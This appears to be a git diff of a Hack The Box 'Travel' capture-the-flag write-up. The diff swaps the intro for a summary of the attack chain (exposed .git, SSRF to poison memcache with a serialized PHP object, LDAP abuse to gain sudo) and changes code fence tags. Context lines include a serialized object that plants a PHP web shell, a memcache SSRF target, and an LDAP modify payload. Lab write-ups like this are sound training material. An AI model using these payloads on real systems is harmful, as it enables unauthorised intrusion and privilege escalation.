@@ -6,7 +6,7 @@ categories: HackTheBox
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled.png)
 
-We are going to pwn Travel from Hack The Box.                                                             
+Travel is super cool box, I personally love this one. We will find an exposed .git folder on one and that provides me the source of the webpage and from there we need code analyze them in GitHub and we need to do a SSRF attack to poison the memcache with a serialized PHP payload to get the shell. For Root, the user lynik-admin is LDAP Administrator with her we add an user to sudo group and add ssh keys and we can just sudo to root.
 
 Link: [https://www.hackthebox.eu/home/machines/profile/252](https://www.hackthebox.eu/home/machines/profile/252)
 
@@ -14,7 +14,7 @@ Let's Begin with our Initial Nmap Scan.
 
 ## Nmap Scan Results
 
-```nix
+```bash
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http     nginx 1.17.6
@@ -62,7 +62,7 @@ Its a wordpress site. I decided to run Gobuster here.
 
 ## GoBuster Result
 
-```nix
+```bash
 ===============================================================
 [+] Url:            http://blog.travel.htb/
 [+] Threads:        10
@@ -109,7 +109,7 @@ Its a wordpress site. I decided to run Gobuster here.
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%206.png)
 
-```nix
+```bash
  _|. _ _  _  _  _ _|_    v0.3.9
 (_||| _) (/_(_|| (_| )
 
@@ -171,7 +171,7 @@ There 3 files which are deleted and successfully got them back.
 
 `README.md`
 
-```nix
+```bash
 # Rss Template Extension
 
 Allows rss-feeds to be shown on a custom wordpress page.
@@ -464,7 +464,7 @@ echo "\n";
 
 I get the serialized object with my payload.
 
-```nix
+```bash
 root@kali:~/CTF/HTB/Boxes/Travel# php attack.php 
 O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}
 ```
@@ -509,7 +509,7 @@ This is the main part:
 
 Accoding to the source file:
 
-```nix
+```bash
 Eg : 127.0.0.1:11211/?timeout=3600&prefix=simplepie_md5("$name:$type")
 
 In our case simplepie_ is xct_ and we need find what is $name and $type
@@ -645,7 +645,7 @@ I got the shell
 
 I started enumeration to get any password for user
 
-```nix
+```bash
 cd /opt
 ls
 wordpress
@@ -707,14 +707,14 @@ So I have created my ssh keys.
 
 Grabbed the sudo id
 
-```nix
+```bash
 lynik-admin@travel:~$ cat /etc/group | grep sudo
 sudo:x:27:trvl-admin
 ```
 
 I created a payload with them.
 
-```nix
+```bash
 dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
 changetype: modify
 replace: homeDirectory
